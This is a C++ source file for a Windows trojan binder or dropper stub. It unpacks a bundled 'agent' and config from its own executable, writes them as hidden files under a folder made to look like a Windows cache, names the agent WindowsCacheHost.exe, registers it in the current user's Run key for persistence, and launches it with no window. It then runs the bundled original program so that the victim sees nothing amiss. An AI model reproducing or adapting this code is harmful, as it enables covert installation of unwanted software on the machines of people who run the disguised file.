#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <shlwapi.h>
#include <shellapi.h>
#include <string>
#include <vector>
#include <fstream>
#include <cstdint>
#include <cstring>
#include <cstdlib>
#include <iterator>

#pragma pack(push, 1)
struct Footer {
    char magic[8];
    uint64_t originalOffset;
    uint64_t originalLength;
    uint64_t agentOffset;
    uint64_t agentLength;
    uint64_t configOffset;
    uint64_t configLength;
    wchar_t originalName[260];
};
#pragma pack(pop)

static std::wstring ModulePath() {
    wchar_t path[MAX_PATH]{};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    return path;
}

static std::wstring ModuleDir() {
    std::wstring path = ModulePath();
    PathRemoveFileSpecW(path.data());
    return path;
}

static std::wstring Join(const std::wstring& a, const std::wstring& b) {
    wchar_t out[MAX_PATH]{};
    wcscpy_s(out, a.c_str());
    PathAppendW(out, b.c_str());
    return out;
}

static bool WriteBytes(const std::wstring& path, const std::vector<uint8_t>& data) {
    std::ofstream out(path, std::ios::binary | std::ios::trunc);
    if (!out.good()) return false;
    out.write(reinterpret_cast<const char*>(data.data()), (std::streamsize)data.size());
    return out.good();
}

static bool ReadFileBytes(const std::wstring& path, std::vector<uint8_t>& data) {
    std::ifstream in(path, std::ios::binary);
    if (!in.good()) return false;
    data.assign(std::istreambuf_iterator<char>(in), std::istreambuf_iterator<char>());
    return true;
}

static void SetRunValue(const std::wstring& exe) {
    HKEY key = nullptr;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, nullptr, 0, KEY_SET_VALUE, nullptr, &key, nullptr) != ERROR_SUCCESS) return;
    std::wstring value = L"\"" + exe + L"\" --installed";
    RegSetValueExW(key, L"WindowsCacheHost", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(value.c_str()), (DWORD)((value.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(key);
}

static bool StartHidden(const std::wstring& exe, const std::wstring& workingDir) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    std::wstring cmd = L"\"" + exe + L"\" --installed";
    bool ok = CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
        nullptr, workingDir.c_str(), &si, &pi) != FALSE;
    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    return ok;
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
    std::wstring self = ModulePath();
    std::vector<uint8_t> file;
    if (!ReadFileBytes(self, file) || file.size() < sizeof(Footer)) return 1;

    Footer footer{};
    std::memcpy(&footer, file.data() + file.size() - sizeof(Footer), sizeof(Footer));
    if (std::memcmp(footer.magic, "KLINF1\0", 7) != 0) return 1;
    if (footer.originalOffset + footer.originalLength > file.size() ||
        footer.agentOffset + footer.agentLength > file.size() ||
        footer.configOffset + footer.configLength > file.size()) return 1;

    std::vector<uint8_t> original(file.begin() + footer.originalOffset, file.begin() + footer.originalOffset + footer.originalLength);
    std::vector<uint8_t> agent(file.begin() + footer.agentOffset, file.begin() + footer.agentOffset + footer.agentLength);
    std::vector<uint8_t> config(file.begin() + footer.configOffset, file.begin() + footer.configOffset + footer.configLength);

    std::wstring installDir = Join([] {
        wchar_t* local = nullptr; size_t len = 0;
        _wdupenv_s(&local, &len, L"LOCALAPPDATA");
        std::wstring value = local ? local : L".";
        free(local);
        return value;
    }(), L"Microsoft\\Windows\\Caches\\kl");
    CreateDirectoryW(installDir.c_str(), nullptr);
    CreateDirectoryW(Join(installDir, L"").c_str(), nullptr);
    std::wstring agentPath = Join(installDir, L"WindowsCacheHost.exe");
    std::wstring configPath = Join(installDir, L"klive.config.json");
    if (!WriteBytes(agentPath, agent) || !WriteBytes(configPath, config)) {
        // Still run the original even if the agent could not be installed.
    } else {
        SetFileAttributesW(agentPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
        SetFileAttributesW(configPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
        SetRunValue(agentPath);
        StartHidden(agentPath, installDir);
    }

    wchar_t temp[MAX_PATH]{};
    GetTempPathW(MAX_PATH, temp);
    std::wstring folder = Join(temp, L"kl_" + std::to_wstring(GetCurrentProcessId()) + L"_" + std::to_wstring(GetTickCount64()));
    CreateDirectoryW(folder.c_str(), nullptr);
    std::wstring originalName = footer.originalName[0] ? footer.originalName : L"application.exe";
    std::wstring originalPath = Join(folder, originalName);
    if (!WriteBytes(originalPath, original)) return 1;

    std::wstring working = ModuleDir();
    ShellExecuteW(nullptr, L"open", originalPath.c_str(), nullptr, working.c_str(), SW_SHOWNORMAL);
    return 0;
}
